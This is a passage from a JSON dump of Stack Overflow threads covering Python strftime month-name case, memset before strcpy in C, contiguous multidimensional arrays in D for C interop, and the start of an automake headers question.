"post_id": 36901047, "comment_id": 61366841, "body": "Sorry, I thought your description of the <code>^</code> caret was rather off-hand and insulting. But you changed it back."}, {"owner": {"reputation": 263593, "user_id": 674039, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/leoFi.gif?s=128&g=1", "display_name": "wim", "link": "https://stackoverflow.com/users/674039/wim"}, "edited": false, "score": 0, "creation_date": 1461794354, "post_id": 36901047, "comment_id": 61367430, "body": "I&#39;m not sure what&#39;s offensive about that.  Yes I changed it back because excessive political-correctness annoys me"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 5, "creation_date": 1461795503, "post_id": 36901047, "comment_id": 61367942, "body": "I only changed it to its correct name, which a 64-k rep commenter should have known. Have you ever seen a Chinese wearing a &quot;coolie hat&quot;? That&#39;s so stereotypical 19th century - I&#39;ll leave the politics to you."}], "answers": [{"comments": [{"owner": {"reputation": 2845, "user_id": 5421745, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/c95c95e7098f89ad77f886fc086fe01e?s=128&d=identicon&r=PG&f=1", "display_name": "wanaryytel", "link": "https://stackoverflow.com/users/5421745/wanaryytel"}, "edited": false, "score": 1, "creation_date": 1461794968, "post_id": 36901541, "comment_id": 61367701, "body": "&quot;I don&#39;t know&quot; is never a valid answer."}, {"owner": {"reputation": 2988, "user_id": 6259990, "user_type": "registered", "profile_image": "https://graph.facebook.com/1743565902555031/picture?type=large", "display_name": "Sven Hakvoort", "link": "https://stackoverflow.com/users/6259990/sven-hakvoort"}, "reply_to_user": {"reputation": 2845, "user_id": 5421745, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/c95c95e7098f89ad77f886fc086fe01e?s=128&d=identicon&r=PG&f=1", "display_name": "wanaryytel", "link": "https://stackoverflow.com/users/5421745/wanaryytel"}, "edited": false, "score": 2, "creation_date": 1461795108, "post_id": 36901541, "comment_id": 61367754, "body": "I mean that as far as i know there are no ways to do it. But a man can always be wrong in my opinion. But it is better to don&#39;t say that here? (i&#39;m new here so don&#39;t know. Just being honest. Appreciate the feedback)"}, {"owner": {"reputation": 13767, "user_id": 2413201, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/rxfuw.jpg?s=128&g=1", "display_name": "Armali", "link": "https://stackoverflow.com/users/2413201/armali"}, "reply_to_user": {"reputation": 2845, "user_id": 5421745, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/c95c95e7098f89ad77f886fc086fe01e?s=128&d=identicon&r=PG&f=1", "display_name": "wanaryytel", "link": "https://stackoverflow.com/users/5421745/wanaryytel"}, "edited": false, "score": 4, "creation_date": 1519196711, "post_id": 36901541, "comment_id": 84805114, "body": "@makaveli - The answer does not consist solely of <i>I don&#39;t know</i>; you should not blindly react to certain key phrases, but rather read context."}], "tags": [], "owner": {"reputation": 2988, "user_id": 6259990, "user_type": "registered", "profile_image": "https://graph.facebook.com/1743565902555031/picture?type=large", "display_name": "Sven Hakvoort", "link": "https://stackoverflow.com/users/6259990/sven-hakvoort"}, "is_accepted": false, "score": 5, "last_activity_date": 1519199362, "last_edit_date": 1519199362, "creation_date": 1461793736, "answer_id": 36901541, "question_id": 36901047, "link": "https://stackoverflow.com/questions/36901047/how-to-lowercase-the-month-name-with-strftime/36901541#36901541", "title": "How to lowercase the month name with strftime", "body": "<p>Just add <code>.lower()</code> after <code>datetime.now()</code>. As far as I know there is no other way to do it.</p>\n"}], "owner": {"reputation": 263593, "user_id": 674039, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/leoFi.gif?s=128&g=1", "display_name": "wim", "link": "https://stackoverflow.com/users/674039/wim"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2858, "favorite_count": 0, "answer_count": 1, "score": -3, "last_activity_date": 1519199362, "creation_date": 1461791784, "last_edit_date": 1461792974, "question_id": 36901047, "link": "https://stackoverflow.com/questions/36901047/how-to-lowercase-the-month-name-with-strftime", "title": "How to lowercase the month name with strftime", "body": "<p>In <a href=\"http://man7.org/linux/man-pages/man3/strftime.3.html\" rel=\"nofollow\">strftime</a> <code>%b</code> is the month name </p>\n\n<pre><code>&gt;&gt;&gt; '{:%b}'.format(datetime.now())\n'Apr'\n</code></pre>\n\n<p>I can uppercase it using chinese-hat modifier carrot thing</p>\n\n<pre><code>&gt;&gt;&gt; '{:%^b}'.format(datetime.now())\n'APR'\n</code></pre>\n\n<p>How do I lowercase it?  i.e. to get the result <code>'{:%b}'.format(dt).lower()</code>, but using the template rather than a post-processing step.</p>\n"}, {"tags": ["c", "memset"], "comments": [{"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 3, "creation_date": 1461791789, "post_id": 36901038, "comment_id": 61366216, "body": "It&#39;s not needed here."}, {"owner": {"reputation": 14469, "user_id": 2191105, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/tPiCW.png?s=128&g=1", "display_name": "David Hoelzer", "link": "https://stackoverflow.com/users/2191105/david-hoelzer"}, "edited": false, "score": 2, "creation_date": 1461791831, "post_id": 36901038, "comment_id": 61366243, "body": "It is not needed but is an example of initializing a memory region before you use it. In this case it doesn&#39;t matter since the <code>strcpy</code> will append a null after the copy."}, {"owner": {"reputation": 23331, "user_id": 134252, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/azWjr.png?s=128&g=1", "display_name": "Dolda2000", "link": "https://stackoverflow.com/users/134252/dolda2000"}, "edited": false, "score": 1, "creation_date": 1461791860, "post_id": 36901038, "comment_id": 61366261, "body": "Some people just like being cautious with their variables so that they don&#39;t risk dealing with uninitialized data. It&#39;s a bit paranoid IMO, but it&#39;s not like it has no merit at all. In this particular case it seems a bit extreme, though."}, {"owner": {"reputation": 1048, "user_id": 947509, "user_type": "registered", "accept_rate": 27, "profile_image": "https://www.gravatar.com/avatar/ba8e2f924a714c9a11e3226f1b51887f?s=128&d=identicon&r=PG", "display_name": "ulyssis2", "link": "https://stackoverflow.com/users/947509/ulyssis2"}, "edited": false, "score": 0, "creation_date": 1461792017, "post_id": 36901038, "comment_id": 61366333, "body": "Get it, thank you all."}, {"owner": {"reputation": 1093, "user_id": 1571801, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b739aed4dad18fc8844f52352fd554a2?s=128&d=identicon&r=PG", "display_name": "atturri", "link": "https://stackoverflow.com/users/1571801/atturri"}, "edited": false, "score": 5, "creation_date": 1461792053, "post_id": 36901038, "comment_id": 61366359, "body": "Not needed in this example, but could be useful if other more complex operations were done on the string in <code>dest</code>. Usually it&#39;s better to define it as <code>char dest[100] = { &#39;\\0&#39; };</code>."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 2, "creation_date": 1461792062, "post_id": 36901038, "comment_id": 61366364, "body": "One salient point is that local variables are not initialised, except by you."}, {"owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "edited": false, "score": 0, "creation_date": 1461792102, "post_id": 36901038, "comment_id": 61366385, "body": "That seems like an outdated concept. Such arrays should be initialized with { 0 }."}, {"owner": {"reputation": 139130, "user_id": 141172, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Vuodg.jpg?s=128&g=1", "display_name": "Eric J.", "link": "https://stackoverflow.com/users/141172/eric-j"}, "edited": false, "score": 1, "creation_date": 1461792206, "post_id": 36901038, "comment_id": 61366432, "body": "Note: it is not needed in this example <i>because strcpy copies the null terminator as well</i>. If you used memcpy to copy just the non-null bytes of the string, for example, you could end up with the string followed by random values in <code>dest</code>."}, {"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "reply_to_user": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "edited": false, "score": 1, "creation_date": 1461793067, "post_id": 36901038, "comment_id": 61366834, "body": "@2501: If you mean that the programmer should initialize such arrays to <code>{ 0 }</code>, that&#39;s ok -- but it&#39;s clearly not necessary in this case. If you mean that the compiler should do it automatically, that just not how it&#39;s defined."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "reply_to_user": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "edited": false, "score": 0, "creation_date": 1461801636, "post_id": 36901038, "comment_id": 61369855, "body": "@2501 why?  Why not initialize them with 0xFF?  If the local was 100MB, would you stil want it initialized every time, just to be overwritten in the next line by a disk read?"}], "answers": [{"tags": [], "owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "is_accepted": true, "score": 7, "last_activity_date": 1461793043, "last_edit_date": 1461793043, "creation_date": 1461792854, "answer_id": 36901334, "question_id": 36901038, "link": "https://stackoverflow.com/questions/36901038/the-necessity-to-memset-with-0-in-a-toy-example/36901334#36901334", "title": "The necessity to memset with &#39;\\0&#39;, in a toy example", "body": "<p>It's not needed in this case, in the sense that it has no effect on the output. It might be needed in some similar cases.</p>\n\n<pre><code>char dest[100];\n</code></pre>\n\n<p>This defines <code>dest</code> as a local array of 100 <code>char</code>s. Its initial value is garbage. It <em>could</em> have been written as:</p>\n\n<pre><code>char dest[100] = \"\";\n</code></pre>\n\n<p>or</p>\n\n<pre><code>char dest[100] = { 0 };\n</code></pre>\n\n<p>but none of those are necessary because <code>dest</code> is assigned a value before it's used.</p>\n\n<pre><code>strcpy(src, \"This is tutorialspoint.com\");\nstrcpy(dest, src);\n</code></pre>\n\n<p>This copies the string contained in <code>src</code> into the array <code>dest</code>. It copies the 26 characters of <code>\"This is tutorialspoint.com\"</code> plus 1 additional character, the terminating <code>'\\0;</code> that marks the end of the string. The previous contents of the <code>dest</code> array are ignored. (If we were using <code>strcat()</code>, it would matter, because <code>strcat()</code> has to find a <code>'\\0'</code> in the destination before it can start copying.)</p>\n\n<p>Without the <code>memset()</code> call, the remaining 73 bytes of <code>dest</code> would be garbage -- but that wouldn't matter, because we never look at anything past the <code>'\\0'</code> at <code>dest[26]</code>.</p>\n\n<p>If, for some reason, we decided to add something like:</p>\n\n<pre><code>printf(\"dest[99] = '%c'\\n\", dest[99]);\n</code></pre>\n\n<p>to the program, then the <code>memset()</code> would matter. But since the purpose of <code>dest</code> is to hold a <em>string</em> (which is by definition terminated by a <code>'\\0'</code> null character), that wouldn't be a sensible thing to do. Perfectly legal, but not sensible.</p>\n"}, {"tags": [], "owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "is_accepted": false, "score": 1, "last_activity_date": 1461864021, "creation_date": 1461864021, "answer_id": 36921443, "question_id": 36901038, "link": "https://stackoverflow.com/questions/36901038/the-necessity-to-memset-with-0-in-a-toy-example/36921443#36921443", "title": "The necessity to memset with &#39;\\0&#39;, in a toy example", "body": "<p>the posted code could skip the initialization via <code>memset()</code>.</p>\n\n<p>A time it really becomes useful is when debugging and you use the debugger to display the contents of the variable. </p>\n\n<p>Another time to use <code>memset()</code> is when allocating something like an array of pointers, which might not all be set to point to something specific, like more allocated memory.  </p>\n\n<p>Then when passing those pointers to 'free()<code>the unused pointers are set to NULL, so will not cause a crash when passed to</code>free()`</p>\n"}], "owner": {"reputation": 1048, "user_id": 947509, "user_type": "registered", "accept_rate": 27, "profile_image": "https://www.gravatar.com/avatar/ba8e2f924a714c9a11e3226f1b51887f?s=128&d=identicon&r=PG", "display_name": "ulyssis2", "link": "https://stackoverflow.com/users/947509/ulyssis2"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1406, "favorite_count": 1, "accepted_answer_id": 36901334, "answer_count": 2, "score": 4, "last_activity_date": 1581949816, "creation_date": 1461791729, "last_edit_date": 1581949816, "question_id": 36901038, "link": "https://stackoverflow.com/questions/36901038/the-necessity-to-memset-with-0-in-a-toy-example", "title": "The necessity to memset with &#39;\\0&#39;, in a toy example", "body": "<p>I encountered the following example of using memset in <a href=\"http://www.tutorialspoint.com/c_standard_library/c_function_strcpy.htm\" rel=\"nofollow noreferrer\">tutorialspoint</a>: </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main(){\n    char src[40];\n    char dest[100];\n\n    memset(dest, '\\0', sizeof(dest));\n    strcpy(src, \"This is tutorialspoint.com\");\n    strcpy(dest, src);\n\n    printf(\"Final copied string : %s\\n\", dest);\n\n    return(0);\n}\n</code></pre>\n\n<p>I don't get why the memset line is used, as the compile and result are the same when that line is commented. I would like to ask is that line necessary? or is it a good practice to do so when doing strcpy()? or it is just one random line.</p>\n\n<p>Thanks!</p>\n"}, {"tags": ["c", "multidimensional-array", "interface", "d"], "comments": [{"owner": {"reputation": 44714, "user_id": 731620, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/6e2168c4647a4f096a14c254bd3d3f68?s=128&d=identicon&r=PG", "display_name": "ratchet freak", "link": "https://stackoverflow.com/users/731620/ratchet-freak"}, "edited": false, "score": 0, "creation_date": 1461939634, "post_id": 36900535, "comment_id": 61440457, "body": "You have a dynamic array of dynamic arrays. You get a continuous memory footprint need to have the inner dimension static."}], "answers": [{"comments": [{"owner": {"reputation": 53, "user_id": 6262079, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d2b870969b780cd2e2137166031b3c3e?s=128&d=identicon&r=PG&f=1", "display_name": "Alchemit", "link": "https://stackoverflow.com/users/6262079/alchemit"}, "edited": false, "score": 0, "creation_date": 1461796082, "post_id": 36900771, "comment_id": 61368156, "body": "These zeros are not really zeros, but rather uninitialized values - in the example I used the <code>double</code> type to see which numbers were initialized. But you are right, it was my assignment to the length property which changed the initial capacity, I took for granted that it should not."}, {"owner": {"reputation": 53, "user_id": 6262079, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d2b870969b780cd2e2137166031b3c3e?s=128&d=identicon&r=PG&f=1", "display_name": "Alchemit", "link": "https://stackoverflow.com/users/6262079/alchemit"}, "edited": false, "score": 0, "creation_date": 1461796729, "post_id": 36900771, "comment_id": 61368406, "body": "Thank you, it works, although I find it strange that the order of indexes in <code>new double[3][1000]</code> is reversed compared to C syntax <code>double a[1000][3]</code> would be 1000 rows. One more question, though - will this array be allocated on the heap or on the stack?"}, {"owner": {"reputation": 1979, "user_id": 1634531, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/02fc16c85eab4a8e38f1c5ac1ae92a17?s=128&d=identicon&r=PG", "display_name": "weltensturm", "link": "https://stackoverflow.com/users/1634531/weltensturm"}, "reply_to_user": {"reputation": 53, "user_id": 6262079, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d2b870969b780cd2e2137166031b3c3e?s=128&d=identicon&r=PG&f=1", "display_name": "Alchemit", "link": "https://stackoverflow.com/users/6262079/alchemit"}, "edited": false, "score": 0, "creation_date": 1461830701, "post_id": 36900771, "comment_id": 61380326, "body": "As I said, the zeros in your GDC example are the length value and really zeroes. The length is never uninitialized. And it is stored next to the data in dynamic arrays. As for the syntax: if <code>double[3]</code> is an array of three doubles, <code>double[3][1000]</code> should be an array of a thousand <code>double[3]</code>s. Think of it as <code>(double[3])[1000]</code>. I wouldn&#39;t hold onto the C syntax too much, as there it isn&#39;t even written next to the type."}, {"owner": {"reputation": 53, "user_id": 6262079, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d2b870969b780cd2e2137166031b3c3e?s=128&d=identicon&r=PG&f=1", "display_name": "Alchemit", "link": "https://stackoverflow.com/users/6262079/alchemit"}, "edited": false, "score": 0, "creation_date": 1461832564, "post_id": 36900771, "comment_id": 61381412, "body": "The same inconsistency is within D itself, shown at the top of my new example after edit; but of course it is not the syntax which is relevant here. As for the lengths, my knowledge about the guts of the D arrays is almost nil but I did check the first example without &quot;%.0f&quot; and also with <code>int</code> and <code>size_t</code> instead of <code>double</code> and I saw strange numbers in places where <code>double</code> values were truncated to 0 by my &quot;%.0f&quot; formatting. And there are no lengths next to rows in my second example, neither."}, {"owner": {"reputation": 1979, "user_id": 1634531, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/02fc16c85eab4a8e38f1c5ac1ae92a17?s=128&d=identicon&r=PG", "display_name": "weltensturm", "link": "https://stackoverflow.com/users/1634531/weltensturm"}, "reply_to_user": {"reputation": 53, "user_id": 6262079, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d2b870969b780cd2e2137166031b3c3e?s=128&d=identicon&r=PG&f=1", "display_name": "Alchemit", "link": "https://stackoverflow.com/users/6262079/alchemit"}, "edited": false, "score": 0, "creation_date": 1461834159, "post_id": 36900771, "comment_id": 61382453, "body": "Oh well, I was also talking out of my realm there. Anyway, updated my answer."}, {"owner": {"reputation": 53, "user_id": 6262079, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d2b870969b780cd2e2137166031b3c3e?s=128&d=identicon&r=PG&f=1", "display_name": "Alchemit", "link": "https://stackoverflow.com/users/6262079/alchemit"}, "edited": false, "score": 0, "creation_date": 1461836809, "post_id": 36900771, "comment_id": 61384381, "body": "Okay, thank you. Short and nice, especially the <code>a.ptr</code> hint. Now I have four ways which do work but I still do not know which are robust. The <code>double[][](rows,columns)</code> construction is not good because a seemingly innocent operation like the assignment to <code>a.length</code> property, which should <i>only</i> change the number of rows, changes the data layout completely behind the scenes. Is <code>double[3][]</code> better? I guess I am on my own to test and <code>assert</code>..."}], "tags": [], "owner": {"reputation": 1979, "user_id": 1634531, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/02fc16c85eab4a8e38f1c5ac1ae92a17?s=128&d=identicon&r=PG", "display_name": "weltensturm", "link": "https://stackoverflow.com/users/1634531/weltensturm"}, "is_accepted": true, "score": 3, "last_activity_date": 1461834626, "last_edit_date": 1461834626, "creation_date": 1461790749, "answer_id": 36900771, "question_id": 36900535, "link": "https://stackoverflow.com/questions/36900535/how-to-create-continuous-multidimensional-arrays-in-d-which-could-be-interfaced/36900771#36900771", "title": "How to create continuous multidimensional arrays in D, which could be interfaced with C code?", "body": "<p>You are using dynamic arrays. Note that they have a length value that can be set, which is shown in your GDC example as zeroes interrupting <code>nan</code>s. Because you set that length value to zero, you effectively tell it to forget that it is supposed to carry 1000 elements. Also D is allowed to reserve memory for future appends, so nested dynamic arrays may not align how you expect.</p>\n\n<p>If you want to send multidimensional arrays to C, best use static arrays or a continuous dynamic array. Your example with static arrays:</p>\n\n<pre><code>void main()\n{\n    auto a = new double[3][1000];\n    a[0] = [1, 2, 3];\n    a[1] = [3, 4, 5];\n    double* p = &amp;(a[0][0]);\n    for(size_t i=0; i&lt;20; i++) {\n        writef(\"%.0f \", *(p+i));\n    }\n    writeln;\n}\n</code></pre>\n\n<p>Prints</p>\n\n<pre><code>1 2 3 3 4 5 nan nan nan nan nan nan nan nan nan nan nan nan nan nan\n</code></pre>\n\n<p>Note that it is an array of a thousand [3] arrays, so [0] and [1] are adjacent.</p>\n\n<p><strong>Edit to answer your edit:</strong></p>\n\n<p>You have two options, both looking identical to C.</p>\n\n<pre><code>// dynamic array of double[3]\ndouble[3][] a;\n\n// or one-dimensional array\ndouble[] a;\n\na.reserve(1000); // ensure space for 1000 new elements (use 3000 for the second option)\n\na ~= [3, 5, 7]; // works for both\n// pass to C using a.ptr\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 53, "user_id": 6262079, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d2b870969b780cd2e2137166031b3c3e?s=128&d=identicon&r=PG&f=1", "display_name": "Alchemit", "link": "https://stackoverflow.com/users/6262079/alchemit"}, "is_accepted": false, "score": 2, "last_activity_date": 1461915405, "last_edit_date": 1461915405, "creation_date": 1461854778, "answer_id": 36918104, "question_id": 36900535, "link": "https://stackoverflow.com/questions/36900535/how-to-create-continuous-multidimensional-arrays-in-d-which-could-be-interfaced/36918104#36918104", "title": "How to create continuous multidimensional arrays in D, which could be interfaced with C code?", "body": "<p>OK, thanks to @weltensturm and with some more testing and reading the logic of D finally \"clicked\", so I summarize.</p>\n\n<p>Basically, to rely on the multidimensional dynamic D arrays layout in memory, <strong>all dimensions apart from the most outer one have to be static</strong>, that is, known at compile time. These declarations:</p>\n\n<pre><code>double[3][] b;                // allocated on the stack, or\nauto b = new double[3][](0);  // allocated on the heap\n</code></pre>\n\n<p>are both understood as dynamic arrays of (static arrays of length 3), and the size of rows is not allowed to change (but the number of rows yes):</p>\n\n<pre><code>b ~= [1,2,3];                 // works\nb ~= [4,5,6,7.];              // Compilation error!\n</code></pre>\n\n<p><strong>That's the best guarantee of robustness one can get.</strong></p>\n\n<p>So while using arrays declared as:</p>\n\n<pre><code>double a[];                   // or\ndouble[][] a;                 //, or\nauto a = new double[][](0,3); // these will be initial dimensions, not static!\n</code></pre>\n\n<p>is possible, <strong>it is asking for trouble</strong> because D runtime is allowed to change any dimension at any operation which change the contents of the array. For example, with any of the above declarations it is possible to append uneven rows:</p>\n\n<pre><code>a ~= [1,2,3];\na ~= [4,5,6,7.];              // accepted\n</code></pre>\n\n<p>and if it triggers memory reallocation, it will also more likely than not change the layout of data in memory.</p>\n\n<p>As a side note, funny is the compiler error about this:</p>\n\n<pre><code>auto b = new double[3][];\nError: new can only create structs, dynamic arrays or class objects, not double[3][]'s\n</code></pre>\n\n<p>as it wasn't a dynamic array, while this:</p>\n\n<pre><code>auto b = new double[3][0];\n</code></pre>\n\n<p>is accepted and it makes an array with static number of columns and dynamic number of rows. Well...</p>\n"}], "owner": {"reputation": 53, "user_id": 6262079, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d2b870969b780cd2e2137166031b3c3e?s=128&d=identicon&r=PG&f=1", "display_name": "Alchemit", "link": "https://stackoverflow.com/users/6262079/alchemit"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 129, "favorite_count": 0, "accepted_answer_id": 36900771, "answer_count": 2, "score": 3, "last_activity_date": 1461915405, "creation_date": 1461789940, "last_edit_date": 1461831241, "question_id": 36900535, "link": "https://stackoverflow.com/questions/36900535/how-to-create-continuous-multidimensional-arrays-in-d-which-could-be-interfaced", "title": "How to create continuous multidimensional arrays in D, which could be interfaced with C code?", "body": "<p>I got interested in the D language and started learning it due to impression that it can support easier and more efficient coding than C or C++, while retaining the ability to use code written in these other languages.</p>\n\n<p>However, trying to construct a 2D array I observed this:</p>\n\n<pre><code>auto a = new double[][](1000,3);    // clean and seemingly elegant\na.length = 0;                       // To fill the array by ~= operator\na ~= [1, 2, 3];                     // fill the first row\nwriteln(a);                         // -&gt; [[1, 2, 3]]  (OK)\nwriteln(a.capacity,a[0].capacity);  // -&gt; 1 3  (should be 1000 3)\n</code></pre>\n\n<p>It already feels wrong, as I explicitly expressed the wish to reserve memory for 1000x3 numbers. Still, both Digital Mars D and GCC gdc compilers produce the same result.</p>\n\n<p>So to make the array really two dimensional, I added another row. </p>\n\n<pre><code>a ~= [3, 4, 5];                     // add another row\nwriteln(a);                         // -&gt; [[1, 2, 3], [4, 5, 6]] (OK)\nwriteln(a.capacity,a[0].capacity);  // -&gt; 3 3\n</code></pre>\n\n<p>This could be acceptable if it meant that the contents of <code>a</code> occupied a solid block of memory with the size of <code>3*3*double.sizeof</code> and row-major layout. But more surprises were on the way - when I wanted to check the layout of this array from the C point of view:</p>\n\n<pre><code>double* p = &amp;(a[0][0]);             // get a C-like pointer to the data\nfor(size_t i=0; i&lt;20; i++) {\n    writef(\"%.0f \", *(p+i));        // should be: 1 2 3 4 5 6 nan nan ...\n    }\nwriteln();\n</code></pre>\n\n<p>I got puzzling results, and different among compilers. Dmd with libphobos2 (version 2.071.0) said:</p>\n\n<pre><code>1 2 3 0 0 0 0 0 4 5 6 0 0 0 0 0 0 0 0 0\n</code></pre>\n\n<p>but with gdc (GCC version 4.8.4) the same code printed this:</p>\n\n<pre><code>1 2 3 0 nan nan nan 0 nan nan nan 0 nan nan nan 0 nan nan nan 0\n</code></pre>\n\n<p>Oops. This is neither usable nor portable. Either the array is not continuous at all (so I read some other memory), or or both implementations are buggy because initialization with <code>nan</code> should be guaranteed. OK, I know already that I can use <code>malloc</code> and do everything like I would do in C, but then I don't see the advantage of learning another huge beast a language with its own quirky hacks.</p>\n\n<p>Is there a clean way to make continuous multidimensional arrays with C layout, without loosing the advantages of D like memory management, ranges, slices, algorithms, etc?</p>\n\n<p><strong>Edit:</strong></p>\n\n<p>After the answer of @weltensturm I fixed my bugs and I did a little more testing. I actually need a dynamic array, because I read the numbers from FIFO and I don't know a priori how many rows to expect. This code apparently works:</p>\n\n<pre><code>auto as = new double[3][0];     // Inconsistent w/C: this is 0 rows by 3 columns\nauto ad = new double[][](0,3);  // also 0 x 3\nas ~= [1,2,3];  as ~= [4,5,6];\nad ~= [1,2,3];  ad ~= [4,5,6];  // I can append to both\nwriteln(as);                    // -&gt; [[1, 2, 3], [4, 5, 6]]\nwriteln(ad);                    // -&gt; [[1, 2, 3], [4, 5, 6]]\nwritefln(\"as capacity: %dx%d\", as.capacity, as[0].capacity);\n                                // -&gt; as capacity: 2x0\nwritefln(\"ad capacity: %dx%d\", ad.capacity, ad[0].capacity);\n                                // -&gt; ad capacity: 3x3\ndouble* p = &amp;(as[0][0]);\nfor(size_t i=0; i&lt;6; i++) writef(\"%.0f \", *(p+i));  // -&gt; 1 2 3 4 5 6\nwriteln();\np = &amp;(ad[0][0]);\nfor(size_t i=0; i&lt;9; i++) writef(\"%.0f \", *(p+i));  // -&gt; 1 2 3 4 5 6 0 0 0\nwriteln();                     \n</code></pre>\n\n<p>Both <code>as</code> and <code>ad</code> are actually dynamic and are resized on append, but they do behave differently - look at the capacities after the appends.</p>\n\n<p>So now the question is, can I rely on the behavior of any of these alternatives? Is it guaranteed by the language at least for the <code>new double[3][0]</code> syntax? Is it possible to guarantee the layout and continuity for the \"dynamic\" (<code>new double[][](0,3)</code>) array, provided I know what <em>not</em> to do (e.g not changing the <code>length</code> property directly)?</p>\n"}, {"tags": ["c", "autotools", "automake"], "comments": [{"owner": {"reputation": 22991, "user_id": 1169096, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/b4d93e08b2830786a7992e8af35514c6?s=128&d=identicon&r=PG", "display_name": "uml&#228;ute", "link": "https://stackoverflow.com/users/1169096/uml%c3%a4ute"}, "edited": false, "score": 0, "creation_date": 1462174074, "post_id": 36900450, "comment_id": 61509469, "body": "please add any additional information to the question itself, rather than abusing some comments."}, {"owner": {"reputation": 2048, "user_id": 6192747, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-agy-meieasc/AAAAAAAAAAI/AAAAAAAAAC8/ipYF1p3tygQ/photo.jpg?sz=128", "display_name": "Stian Skjelstad", "link": "https://stackoverflow.com/users/6192747/stian-skjelstad"}, "edited": false, "score": 0, "creation_date": 1462471221, "post_id": 36900450, "comment_id": 61661476, "body": "Please, make a mimimal complete working example <a href=\"http://stackoverflow.com/help/mcve\">stackoverflow.com/help/mcve</a>  (A small collection of Makefile.am in your case)"}], "answers": [{"tags": [], "owner": {"reputation": 11221, "user_id": 436559, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/8d6b535e4fadefca3e9cab9b6b1ee49b?s=128&d=identicon&r=PG", "display_name": "fluter", "link": "https://stackoverflow.com/users/436559/fluter"}, "is_accepted": true, "score": 4, "last_activity_date": 1462781199, "creation_date": 1462781199, "answer_id": 37110578, "question_id": 36900450, "link": "https://stackoverflow.com/questions/36900450/how-to-use-autotools-nobase-and-nodist-prefixs-together-on-include-headers/37110578#37110578", "title": "How to use autotools nobase and nodist prefixs together on include_HEADERS", "body": "<p>If the headers were generated by a program, you should mark them with <code>BUILT_SOURCES</code>, this way <code>automake</code> will not be confused to try to install them as <code>dist</code>.</p>\n\n<p>Second, for headers files that are not meant to be installed, it's better to use <code>SOURCES</code> directive, rather than <code>HEADERS</code>. Try this:</p>\n\n<pre><code>nobase_include_SOURCES += hcrypto/aes.h \\\n  